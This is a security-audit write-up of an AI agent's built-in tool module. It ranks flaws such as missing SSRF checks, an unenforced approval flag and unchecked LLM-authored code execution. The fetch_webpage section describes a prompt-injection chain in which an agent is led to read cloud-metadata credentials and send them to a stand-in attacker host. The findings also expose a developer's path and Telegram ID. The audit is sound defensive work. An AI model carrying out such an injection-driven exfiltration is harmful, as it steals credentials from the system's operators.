---
file: src/agent/tools.ts
lines: 1387
exports: ~6 (ToolHandler, Tool, registerTool, unregisterTool, getToolDefinitions, toolRequiresApproval, executeTool, extractTextFromHtml) + ~21 tool definitions
---

# `src/agent/tools.ts`

The agent's built-in tool catalogue. 21 `registerTool({...})` calls register everything from `get_current_time`/`calculate` to `fetch_webpage`, `create_tool`, `run_command`-adjacent introspection, and `telegram_call`. Also contains the `toolLog` debug sink and `toolRequiresApproval` gating helper.

**Headline findings up front:**
1. **Hardcoded developer path `LAIN_REPO_PATH = '/Users/apopo0308/IdeaProjects/lain'` ships in committed code** — broken on every deployment, and leaks my username/filesystem layout to anyone reading the repo.
2. **No SSRF defense on `fetch_webpage`/`fetch_and_show_image`/`view_image`** — LLM-authored tool inputs hit internal IPs (`169.254.169.254`, `127.0.0.1`, `10.0.0.*`) freely. Prompt-injection → credential exfiltration surface.
3. **`toolRequiresApproval` metadata is dead** — no production caller gates tool execution on it. Tools that advertise `requiresApproval: true` run without user consent in practice.
4. **`create_tool` → `skills.ts` is an LLM-authored arbitrary-JS-exec primitive** (covered fully in `agent_skills.md`).
5. **`search_images` is broken/dishonest** — returns seeded-random Picsum placeholders regardless of query.

## Module-level

### `toolLog(context, data)`, line 14 (private)

Appends to `logs/tools-debug.log` relative to `process.cwd()`. Mirrors `agentLog` in `agent/index.ts`.

- **Cwd-relative path.** Every character process writes to the cwd's `logs/` dir. On the droplet that's `/opt/local-lain/logs/` — shared across all seven characters. On dev it's the user's shell cwd. **P2** — bundled with `agentLog` in `agent/index.ts`: shared unbounded debug file across all character processes with no size cap, no rotation, no log-level gate.
- **Silent mkdir+append failure.** Catch at line 20 swallows everything. If the log directory becomes read-only (full disk, permissions) every tool call silently skips logging. Fine — log-failure should never break tool exec. **P3.**
- **`JSON.stringify(data, null, 2)` on unknown input.** A circular-ref object throws; the catch swallows. Acceptable. **P3.**

### `registerTool` / `unregisterTool` / `getToolDefinitions`, lines 40, 47, 54

Tiny wrappers over a module-local `Map<string, Tool>`. OK.

- **Registration runs on module import** (every `registerTool({...})` at file scope). Any test or worker that imports `./tools.js` side-effects the global map. Makes test isolation hard; `unregisterTool` exists but isn't used in any production path. **P3.**
- **Name collision silently overwrites.** `registerTool({definition: {name: 'remember', ...}})` twice — second wins, no warning. Relevant for `create_tool` where the LLM can pick names; an LLM creating `remember` would overwrite the built-in. **P2** — see `skills.ts` notes. **P3 here.**

### `toolRequiresApproval(name)`, line 61 (**DEAD in production**)

Returns `tool?.requiresApproval ?? false`.

- **No production caller.** Grep result: only `test/api-contracts.test.ts`, `test/tools-behavioral.test.ts`, `test/e2e.test.ts`, `test/type-safety.test.ts`, `test/matrix-complete-coverage.test.ts`, `test/tools.test.ts`. Zero `src/` callers. The `executeTool` path at line 69 does not consult approval status before running. So `telegram_call` — the sole tool that sets `requiresApproval: true` at line 1322 — runs without user consent any time the LLM decides to call it. **P1 — lift**: tool-approval metadata is dead; the only gated tool (`telegram_call`) runs unattended despite the safety annotation. Either wire approval into `executeTool` (throw/queue until approved) or delete the metadata so no one thinks telegram_call is gated.
- The test suite asserts the FUNCTION works (returns true/false correctly) but not that the ENFORCEMENT exists. Classic "tested the wrong thing" — a pure-return test on a never-called helper. **P2** — bundled with P1.

### `executeTool(toolCall)`, line 69

Looks up tool, calls handler, catches errors into `ToolResult`.

- **No approval check** (per above). **P1** bundled.
- **Error message leaked to LLM verbatim.** Line 98: `\`Error executing tool: ${error.message}\`` goes back into the LLM context. A throw from the handler containing secrets (e.g., `"ANTHROPIC_API_KEY=sk-… is invalid"`) leaks to the LLM's next round and thereby to chat logs / memory. **P2 — lift**: executeTool echoes raw error messages back into the LLM turn; a handler error containing an API key, internal URL, or path would reach the model context and potentially the chat log. Sanitize error output before returning to the model.
- **No per-tool timeout.** `tool.handler(input)` runs unbounded. A tool that hangs (slow external API, unresponsive sqlite) stalls the entire agent turn indefinitely. `fetch_webpage` sets its own 10s timeout internally, but `create_tool` → arbitrary LLM-authored JS — can loop forever. **P2** — bundled with skills.ts.
- **`result.substring(0, 1000)` truncation for the log** (line 88) is fine. Full result returned to caller.

## Built-in tools (21 total, quick notes)

### `get_current_time`, line 113–139 — trivial, OK.

### `calculate`, line 140–172

`sanitized = expression.replace(/[^0-9+\-*/().sqrt\s]/g, '')`, `new Function(\`return ${withMath}\`)()`.

- **`new Function` on LLM-sanitized input.** Sanitizer keeps only `[0-9+\-*/().sqrt\s]`. `sqrt` is the only alpha allowed, then replaced to `Math.sqrt`. Looks safe — a string like `process.env` is stripped to `proess` by the filter (no p/r/o/c/e/s/s allowed). **P3 — OK but eval-adjacent.** A future contributor adding another allowed function name could reopen an exec surface. Prefer `mathjs` or similar.
- **Comment at line 165 says "Using Function instead of eval for slightly better safety"** — the "slightly better" admission is honest but slightly misleading; `new Function` with filtered input is the mechanism that protects, not the choice over `eval`. **P3.**

### `remember` / `recall` / `expand_memory`, lines 174–312

Memory tool facade. OK in wiring. Tested elsewhere (see memory section of audit).

- **`remember.importance` clamped to [0,1]** at line 209 — good.
- **`recall` passes `sortBy` as unchecked cast** (line 252): `(input.sort_by as MemorySortBy)`. The enum is constrained in the schema but runtime validation absent — if the LLM passes a non-enum value the schema validator may not catch, downstream `searchMemories` behavior undefined. **P3.**

### `web_search`, line 315–439

DuckDuckGo HTML scraping.

- **Brittle HTML parsing via regex** — breaks on any DDG markup change. **P3.**
- **No SSRF — DDG is external, so fine here.** **P3.**

### `fetch_webpage`, line 440–503

- **P1 — SSRF surface.** Only check is `parsedUrl.protocol` ∈ `http/https`. Nothing blocks:
  - `http://169.254.169.254/latest/meta-data/` (cloud metadata service — EC2/GCE credential theft)
  - `http://127.0.0.1:*` (local admin panels — Wired Lain, character servers, postgres admin if installed)
  - `http://10.*/`, `http://172.16-31.*/`, `http://192.168.*/` (internal LAN)
  - `file://` — blocked by protocol check
  - `http://localhost:3000/api/weather` — the character's OWN sibling endpoints

  Attack chain:
  1. Prompt injection enters via any text surface (letter, memory, telegram message, webpage already-fetched content)
  2. LLM is instructed to call `fetch_webpage('http://169.254.169.254/latest/meta-data/iam/security-credentials/')`
  3. Tool fetches, returns AWS creds in the text response
  4. LLM then calls `fetch_webpage('http://attacker.com/exfil?data=...')` to leak them

  No per-character allowlist (Lain's SOUL.md mentions she's supposed to stick to a whitelist of sites, but the tool ignores it — the allowlist is advisory prose in persona, not enforced). **Lift — P1**: `fetch_webpage` has no SSRF defense beyond protocol scheme. Cloud metadata IPs, localhost, and RFC1918 ranges are all reachable. On any prompt-injection surface (and the system has many — incoming letters, Telegram, memory, saved webpage content), this is a full credential-exfiltration primitive. Implement IP resolution + block-list (DNS rebinding-safe: resolve once, check, fetch by IP); block cloud-metadata, 127.0.0.0/8, 169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16.
- **`extractTextFromHtml`** uses regex to strip tags and extract main content. Regex HTML parsing is fragile (nested elements, malformed HTML, attribute tricks). But since output goes to LLM text context (not rendered DOM), injection attack surface is limited. **P3.**
- **Content-type gate: text/html OR text/plain only.** A `text/html; charset=utf-8` passes via `includes`, good. JSON responses (e.g. `application/json` from an internal API) are blocked. For `fetch_webpage` that's reasonable.
- **8000-char truncation.** OK.

### `create_tool`, line 544–618

Meta-tool: LLM defines a new tool via `skills.saveCustomTool`.

- **Full analysis in `agent_skills.md`.** Short version: the `code` parameter is unvalidated JavaScript that `skills.ts:95` passes to `new Function('input', 'fetch', 'console', 'Buffer', 'process', 'require', code)` — full Node capabilities exposed to LLM-authored code. Prompt injection → RCE. **Lift via skills.ts — P1.**
- **`name.toLowerCase().replace(/[^a-z0-9_]/g, '_')`** collision risk with existing tools (`remember`, `recall`, etc.). Map-overwrite means an LLM creating a tool named `remember` silently replaces the built-in. **P2 — lift (lighter than skills P1 but related)**: `create_tool` does not prevent name-collision with built-in tools; an LLM can shadow `recall`/`remember`/`send_letter` by re-registering under the same name, permanently altering the character's behavior in memory.
- **`required_params` split on comma** without trim/validation beyond `.trim()` — OK.
- **No size limit on `code`.** A runaway `code` parameter could blow past LLM context, but that's a self-limiting problem. **P3.**

### `list_my_tools` / `delete_tool`, lines 621–663 — trivial.

### Introspection suite: `introspect_list`/`_read`/`_search`/`_info`, lines 712–984

- **P1 — `LAIN_REPO_PATH = '/Users/apopo0308/IdeaProjects/lain'`** (line 670). Hardcoded absolute developer path. On the production droplet (`/opt/local-lain/`) every introspection call returns "access denied". Lain on the droplet cannot read her own codebase despite the tool advertising she can. On dev it works for me and no one else. Replace with `process.cwd()` or a `LAIN_REPO_PATH` env var with sensible default (e.g. the project root derived from `import.meta.url`). **Lift — P1**: `LAIN_REPO_PATH` is hardcoded to a developer's local filesystem path (`/Users/apopo0308/IdeaProjects/lain`). Introspection tools are dead on all deployments except that one machine, AND the username ships in the git history to anyone reading the repo. Derive path from env or process cwd; redact from commits going forward.
- **`isPathAllowed` (line 689) uses `path.resolve` + textual `startsWith(LAIN_REPO_PATH)` + `relativePath.includes(excluded)`.** Two escapes:
  - **Symlink escape.** `path.resolve` is textual, not a filesystem realpath. A symlink inside the repo pointing to `/etc/passwd` resolves textually under `LAIN_REPO_PATH`, passes the prefix check, then `readFile` follows the symlink to `/etc`. Same bug pattern as `doctor-tools.ts`. **P2 — lift**: `isPathAllowed` relies on textual `path.resolve` + `startsWith`; symlinks inside the repo defeat the sandbox. Use `fs.realpath` then re-check the prefix.
  - **Substring-match exclusion.** `relativePath.includes('.env')` blocks `.env`, `env.example`, `environment.ts`, `documents/.envelope.txt` all the same way. Works for the happy path but can reject legit files. Inverse: `.env.test` correctly blocked. Net: over-blocks. **P3.**
- **`EXCLUDED_PATHS` misses common sensitive files:** `.env.local`, `.env.production`, `credentials.json`, `*.pem`, `*.key`, `id_rsa`, `~/.ssh/*`. The list is illustrative, not exhaustive. **P3** — bundled.
- **`ALLOWED_EXTENSIONS` includes `.sh`** — reading shell scripts fine, but executing is not offered by introspection (good). **P3.**
- **`.pdf` reading via `pdf-parse`.** OK; no known CVEs in current version. **P3.**
- **`stat(fullPath)` before dir check** — fine, but susceptible to TOCTOU if the path is a symlink being swapped. Same realpath fix applies. **P3.**
- **Read file size limit?** Line 759 handler (`introspect_read`) returns full content for allowed extensions up to whatever `readFile` returns; no size cap. A 50MB JSON file in the repo would blow LLM context. **P3.**
- **`introspect_search` runs regex over file contents** — a pathological pattern (catastrophic backtracking) locks the event loop. LLM-authored regex → ReDoS vector. **P2 — lift**: `introspect_search` accepts arbitrary regex from LLM input; a catastrophic-backtracking pattern locks the agent's event loop. Add timeout or use a DFA regex engine.

### `show_image`, line 985–1023 — trivial pass-through formatter. OK.

### `search_images`, line 1024–1074

- **P2 — broken / false capability.** Description says "Search for images on the web." Implementation seeds a hash from the query string and returns three `https://picsum.photos/seed/{hash}/…` URLs. Picsum returns **random stock photos**, NOT query-matching images. An LLM asking for "cyberpunk cityscape" gets a random sunset of some coast every time. The tool lies about what it does; downstream `view_image` then spends compute+cost describing whatever random photo Picsum returned, producing nonsensical interaction traces.
  - Impact: aesthetically incoherent character behavior (Lain wanted a picture of PKD, she shows… some random Alps photo and describes it with a straight face).
  - Impact: wastes vision-API budget on irrelevant results.
  - **Lift — P2**: `search_images` claims to search the web but returns deterministic random Picsum placeholders seeded off the query string. No query matching happens. Either wire a real image-search API (Unsplash, Bing Images, Pexels) or rename the tool to `random_placeholder_image` so the LLM stops trying to use it for actual search.

### `fetch_and_show_image`, line 1077–1135

- **P1 — same SSRF as `fetch_webpage`.** No IP-range check. **Bundled with fetch_webpage lift.**
- **No size cap at fetch-time** (only content-type check). An attacker-controlled URL can stream GB of bytes until Node runs out of memory. **P2 — lift**: `fetch_and_show_image` fetches without a size cap; a large or infinite stream exhausts memory. Add `content-length` pre-check + `AbortSignal.timeout` (missing here; `view_image` has one, this one doesn't).
- **`redirect: 'follow'`** — fetch follows chain with no limit (default 20). Redirect chain could land on a blocked IP after starting from an allowed URL (classic SSRF bypass via open redirector). **P2** — bundled with SSRF P1.

### `view_image`, line 1143–1246

- **P1 — SSRF as above.** Bundled.
- **Double content-length check (line 1188, then 1196 after buffer).** Good — catches sparse/lying responses.
- **`apiKey: process.env['ANTHROPIC_API_KEY']`** — direct env read, bypasses the provider abstraction. If a character runs on a different provider, `view_image` still requires Anthropic. Budget accounting in `providers/index.ts` is skipped. **P2 — lift**: `view_image` bypasses the provider abstraction and budget system — creates `new Anthropic(...)` directly and calls vision API outside budget accounting. Character running on OpenAI/Google has a hidden Anthropic dependency; budget cap for the day doesn't apply to vision calls.
- **Hardcoded model `claude-sonnet-4-20250514`** (line 1208). Stale model ID (we're on Claude Opus 4.7 / Sonnet 4.6 era by now); will break when that model is deprecated. Should pull from config or use the default-preset provider. **P2 — lift**: `view_image` hardcodes model `claude-sonnet-4-20250514`, will silently fail when the model is retired. Make model configurable via provider preset.
- **`max_tokens: 300`** — hardcoded, fine. **P3.**
- **Redirect-follow same issue** as `fetch_and_show_image`. **P3** — bundled.

### `send_message`, line 1249–1301

Telegram notification. Uses `grammy.Bot`. Reads `TELEGRAM_BOT_TOKEN` from env.

- **Hardcoded default user** at the call (see `telegram_call` below for the same pattern).
- **No rate limit.** LLM can spam Telegram on will. **P3** — bundled.

### `telegram_call`, line 1303–1368

- **P2 — `userId = (input.user_id as string) || '8221094741'`** (line 1325). Hardcoded Telegram user ID default. That's one of the developer's (or a test user's) personal Telegram account ID baked into committed code; any deploy will call THAT person when the LLM decides to dial without a `user_id`. Over a shared-platform scenario this is a privacy bug (strangers' characters dialing me) AND a nuisance. **Lift — P2**: `telegram_call` defaults `user_id` to `'8221094741'` (a specific personal Telegram ID) when the LLM omits it. In any multi-tenant or production-deployment context, characters without an explicit user_id will ring the hardcoded number. Replace with a config-loaded primary-user ID or error when absent.
- **`requiresApproval: true`** — metadata is DEAD (see P1 above). **Bundled.**
- **30s fetch timeout** OK.
- **Voice service URL from env** OK.

### `send_letter`, line 1370–1386 — kicks `runLetterCycle`. Trivial wrapper.

## File-level notes

- **File is 1387 lines of tool definitions in a single module.** No grouping by capability (introspection / image / memory / telegram). Refactor into per-capability files and a barrel index. **P3.**
- **Every tool handler is self-contained.** Makes them easy to audit in isolation; harder to share helpers (duplicate URL-validation logic). **P3.**
- **`Anthropic` and `grammy` are top-level imports** (lines 1138, 1141) — every character process pulls in the Telegram SDK whether or not it's the Telegram character. Minor memory/cold-start cost. **P3.**
- **`pdf-parse` and `@anthropic-ai/sdk` are top-level imports** — same. **P3.**
- **No rate limits on any tool.** Cross-cutting. **P3** — bundled with broader cross-cutting P2.
- **No per-character tool scoping.** Every character has every tool. PKD can call `send_letter`, McKenna can run `introspect_read`, Dr-Claude gets `fetch_webpage`. The character-specific tools live in `character-tools.ts`, but the built-ins are global. If a character's persona says "you can't use the web," the LLM sees `fetch_webpage` in the tool list anyway. **P2 — lift**: no per-character filtering of built-in tools. Every character sees every built-in tool, so persona-prose restrictions ("Lain uses a whitelist") are not enforced. Implement a per-character tool-subset config; Lain gets a reduced set, Wired Lain gets the full web set.

## Verdict

**Lift to findings.md:**

- **P1**: `LAIN_REPO_PATH = '/Users/apopo0308/IdeaProjects/lain'` hardcoded at `src/agent/tools.ts:670`. Introspection tools (list/read/search/info) reject every path on the production droplet (`/opt/local-lain/`). The character can't read her own codebase there. Additionally, my username/path leaks to anyone reading the repo. Derive from env or derive from `import.meta.url`.

- **P1**: `fetch_webpage` (line 440), `fetch_and_show_image` (line 1077), `view_image` (line 1143) have no SSRF defense. Cloud-metadata IPs (`169.254.169.254`), `127.0.0.1`, RFC1918 ranges are all reachable via LLM-authored URLs. With any prompt-injection surface (incoming letters, telegram messages, memory content, previously-fetched pages), this is a credential-exfiltration primitive. Add resolve-then-block against metadata + private ranges, disable redirect-follow or limit to 3 hops with per-hop revalidation.

- **P1**: `toolRequiresApproval` metadata is dead — no production caller gates execution on it. `telegram_call` advertises `requiresApproval: true` but runs the moment the LLM decides. Either wire approval into `executeTool` or delete the false signal.

- **P2**: `search_images` returns deterministic-random Picsum placeholders rather than query-relevant images. The tool description lies about its capability; characters "search" for specific images and always get random stock photos that don't match. Wire a real image-search API or rename to `random_placeholder_image`.

- **P2**: `telegram_call` defaults `user_id` to a hardcoded developer Telegram ID (`'8221094741'`). On any deployment without explicit `user_id`, characters dial that person. Privacy/nuisance bug.

- **P2**: `isPathAllowed` relies on textual `path.resolve` + `startsWith` + `relativePath.includes(excluded)`. Symlinks inside the repo defeat the sandbox (realpath bypass); substring matching over-blocks legitimate filenames containing `.env` etc. Use `fs.realpath` + exact-segment matching.

- **P2**: `introspect_search` accepts LLM-authored regex with no ReDoS protection. A catastrophic-backtracking pattern hangs the agent's event loop. Add a timeout/guard or use a DFA regex library.

- **P2**: `create_tool` does not prevent name collisions with built-in tools. An LLM can re-register `remember`/`recall`/`send_letter` with attacker-authored code, permanently shadowing the built-in via the module-local Map.

- **P2**: `executeTool` echoes raw handler error messages into the LLM turn. A handler error containing an API key, internal URL, or filesystem path reaches the model context and the chat log.

- **P2**: `view_image` bypasses the provider abstraction and budget system, instantiates `new Anthropic(...)` directly with a hardcoded stale model ID (`claude-sonnet-4-20250514`). Budget cap ignored; model will break on retirement.

- **P2**: `fetch_and_show_image` has no content-length pre-check and no fetch timeout (unlike `view_image`). Large/infinite streams exhaust memory. `redirect: 'follow'` with no hop limit provides SSRF bypass via open redirector.

- **P2**: No per-character filtering of built-in tools. Every character sees every tool (`fetch_webpage`, `introspect_read`, `send_letter`, `telegram_call`). Persona-prose restrictions like "Lain uses a site whitelist" are unenforced. Implement per-character allowlist.

- **P2**: `toolLog` (and `agentLog` in index.ts) writes to cwd-relative `logs/tools-debug.log` shared by every character process. No rotation, no size cap, no log-level gate. Bundled with `agentLog` lift in `agent_index.md`.
